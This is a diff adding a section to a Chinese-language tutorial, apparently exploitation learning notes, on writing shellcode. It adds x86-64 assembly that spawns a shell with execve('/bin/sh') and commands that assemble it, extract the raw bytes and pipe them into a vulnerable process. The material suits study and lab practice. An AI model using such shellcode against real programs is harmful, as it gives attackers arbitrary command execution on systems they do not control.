@@ -28,7 +28,39 @@ comments: true
 
 ## 2. 编写shellcode<br>
 `shellcode`之所以叫`shellcode`，是因为**利用的目标就是达成任意命令执行**,而一个经典的攻击模式就是启动`shell`:`execve("/bin/sh", NULL, NULL)`<br>
+```asm
+.global _start
+_start:
+.intel_syntax noprefix
+mov rax, 59		# this is the syscall number of execve
+lea rdi, [rip+binsh]	# points the first argument of execve at the /bin/sh string below
+mov rsi, 0		# this makes the second argument, argv, NULL
+mov rdx, 0		# this makes the third argument, envp, NULL
+syscall			# this triggers the system call
+binsh:				# a label marking where the /bin/sh string is
+.string "/bin/sh"
+```
+在写完`asm`后，介绍一下编译等涉及汇编的命令吧<br>
+```
+1. Assembling shellcode:
+gcc -nostdlib -static shellcode.s -o shellcode-elf
 
+2. Extracting shellcode:
+objcopy --dump-section .text=shellcode-raw shellcode-elf
+
+3. Disassembling shellcode:
+objdump -M intel -d shellcode-elf
+
+4. Sending shellcode to the stdin of a process (with user input afterwards):
+cat shellcode-raw /dev/stdin | /vulnerable_process
+
+5. Strace a program with your shellcode as input:
+cat shellcode-raw | strace /vulnerable_process
+
+6. Debug a program with your shellcode as input:
+gdb /vulnerable_process
+(gdb) r < shellcode-raw
+```
 
 ## 3. debugging shellcode<br>
 
